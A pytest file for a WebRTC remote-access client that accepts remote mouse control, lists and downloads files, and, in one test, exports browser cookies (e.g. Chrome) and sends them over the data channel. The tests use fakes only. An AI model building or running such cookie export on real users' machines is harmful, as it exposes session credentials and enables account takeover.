import asyncio
import base64
import json

from remote_client.files.file_service import FileService
from remote_client.webrtc.client import WebRTCClient


class CapturingChannel:
    def __init__(self) -> None:
        self.sent: list[str] = []

    def send(self, message: str) -> None:
        self.sent.append(message)


class FakeSessionDescription:
    def __init__(self, sdp: str, type_: str) -> None:
        self.sdp = sdp
        self.type = type_


class FakePeerConnection:
    def __init__(self) -> None:
        self.added_tracks: list[object] = []
        self.handlers: dict[str, object] = {}
        self.remoteDescription: FakeSessionDescription | None = None
        self.localDescription: FakeSessionDescription | None = None
        self.state = "new"
        self.closed = False

    def addTrack(self, track: object) -> None:
        self.added_tracks.append(track)

    def getTransceivers(self) -> list[object]:
        return []

    def on(self, event: str):
        def decorator(handler):
            self.handlers[event] = handler
            return handler

        return decorator

    @property
    def connectionState(self) -> str:
        return self.state

    async def setRemoteDescription(self, offer: FakeSessionDescription) -> None:
        self.remoteDescription = offer

    async def createAnswer(self) -> FakeSessionDescription:
        return FakeSessionDescription("answer-sdp", "answer")

    async def setLocalDescription(self, answer: FakeSessionDescription) -> None:
        self.localDescription = answer
        self.state = "connected"
        handler = self.handlers.get("connectionstatechange")
        if handler:
            self.state = "disconnected"
            await handler()
            self.state = "connected"

    async def close(self) -> None:
        self.closed = True
        handler = self.handlers.get("connectionstatechange")
        if handler:
            await handler()


class FakeCookieExporter:
    def __init__(self, payload: str) -> None:
        self.payload = payload
        self.requests: list[object] = []

    def export_base64(self, browsers):
        self.requests.append(browsers)
        return self.payload


class FakeSignaling:
    def __init__(self, offer: FakeSessionDescription) -> None:
        self.offer = offer
        self.connected = False
        self.sent: list[object] = []
        self.received = False
        self.closed = False

    async def connect(self) -> None:
        self.connected = True

    async def receive(self) -> FakeSessionDescription:
        self.received = True
        return {"type": self.offer.type, "sdp": self.offer.sdp}

    async def send(self, description: FakeSessionDescription) -> None:
        self.sent.append(description)

    async def close(self) -> None:
        self.closed = True


class FailingSignaling:
    async def connect(self) -> None:
        raise ConnectionError("refused")

    async def close(self) -> None:
        return None


def test_list_files_dir_and_file(tmp_path):
    file_service = FileService()
    subdir = tmp_path / "subdir"
    subdir.mkdir()
    test_file = tmp_path / "example.txt"
    test_file.write_bytes(b"hello")

    entries = file_service.list_files(str(tmp_path))
    results = file_service.serialize_entries(entries)
    entries = {entry["name"]: entry for entry in results}

    dir_entry = entries[subdir.name]
    file_entry = entries[test_file.name]

    assert dir_entry["is_dir"] is True
    assert dir_entry["size"] is None
    assert file_entry["is_dir"] is False
    assert file_entry["size"] == test_file.stat().st_size


def test_handle_control_message_routes_to_handler(client, control_handler, channel):
    payload = {"action": "control", "type": "mouse_move", "x": 10, "y": 15}

    asyncio.run(client._handle_message(channel, payload, control_handler))

    assert control_handler.handled == [payload]
    assert channel.sent == []


def test_handle_list_files_sends_serialized_entries(
    client, control_handler, file_service, file_entries, channel
):
    payload = {"action": "list_files", "path": "/tmp"}

    asyncio.run(client._handle_message(channel, payload, control_handler))

    assert file_service.listed_paths == ["/tmp"]
    assert len(channel.sent) == 1
    message = json.loads(channel.sent[0])
    assert message["path"] == "/tmp"
    assert message["files"] == file_service.serialize_entries(file_entries)


def test_handle_download_sends_payload(
    client, control_handler, file_service, base64_payload, channel
):
    payload = {"action": "download", "path": "/tmp/report.txt"}

    asyncio.run(client._handle_message(channel, payload, control_handler))

    assert file_service.read_paths == ["/tmp/report.txt"]
    assert channel.sent == [base64_payload]


def test_integration_download_reads_and_transfers_file(tmp_path, control_handler):
    source_file = tmp_path / "report.bin"
    source_bytes = b"binary-payload-\x00\x01"
    source_file.write_bytes(source_bytes)

    file_service = FileService()
    client = WebRTCClient(
        session_id="test-session",
        signaling=None,
        session_factory=lambda _mode: (control_handler, []),
        file_service=file_service,
    )
    channel = CapturingChannel()

    payload = {"action": "download", "path": str(source_file)}
    asyncio.run(client._handle_message(channel, payload, control_handler))

    assert channel.sent == [base64.b64encode(source_bytes).decode()]

    received_file = tmp_path / "received.bin"
    received_bytes = base64.b64decode(channel.sent[0])
    received_file.write_bytes(received_bytes)
    assert received_file.read_bytes() == source_bytes


def test_handle_export_cookies_sends_payload(control_handler):
    exporter = FakeCookieExporter("Y29va2llcy1kYXRh")
    client = WebRTCClient(
        session_id="test-session",
        signaling=None,
        session_factory=lambda _mode: (control_handler, []),
        file_service=object(),
        cookie_exporter=exporter,
    )
    channel = CapturingChannel()

    payload = {"action": "export_cookies", "browsers": ["chrome"]}
    asyncio.run(client._handle_message(channel, payload, control_handler))

    assert exporter.requests == [["chrome"]]
    assert channel.sent == ["Y29va2llcy1kYXRh"]


def test_run_once_successful_handshake_marks_connected(monkeypatch):
    offer = FakeSessionDescription("offer-sdp", "offer")
    signaling = FakeSignaling(offer)
    peer_connection = FakePeerConnection()

    client = WebRTCClient(
        session_id="test-session",
        signaling=signaling,
        session_factory=lambda _mode: (object(), []),
        file_service=object(),
    )

    monkeypatch.setattr(
        "remote_client.webrtc.client.RTCPeerConnection",
        lambda *_args, **_kwargs: peer_connection,
    )

    asyncio.run(client._run_once())

    assert signaling.connected is True
    assert signaling.received is True
    assert peer_connection.remoteDescription.sdp == offer.sdp
    assert peer_connection.remoteDescription.type == offer.type
    assert peer_connection.localDescription is not None
    assert len(signaling.sent) == 2
    assert signaling.sent[0]["type"] == "register"
    assert signaling.sent[0]["session_id"] == "test-session"
    assert signaling.sent[0]["role"] == "client"
    assert signaling.sent[1] == {
        "type": peer_connection.localDescription.type,
        "sdp": peer_connection.localDescription.sdp,
    }
    assert peer_connection.state == "connected"
    assert peer_connection.closed is True
    assert signaling.closed is True


def test_run_once_failed_connection_closes_peer(monkeypatch):
    peer_connection = FakePeerConnection()

    client = WebRTCClient(
        session_id="test-session",
        signaling=FailingSignaling(),
        session_factory=lambda _mode: (object(), []),
        file_service=object(),
    )

    monkeypatch.setattr(
        "remote_client.webrtc.client.RTCPeerConnection",
        lambda *_args, **_kwargs: peer_connection,
    )

    asyncio.run(client._run_once())

    assert peer_connection.closed is True
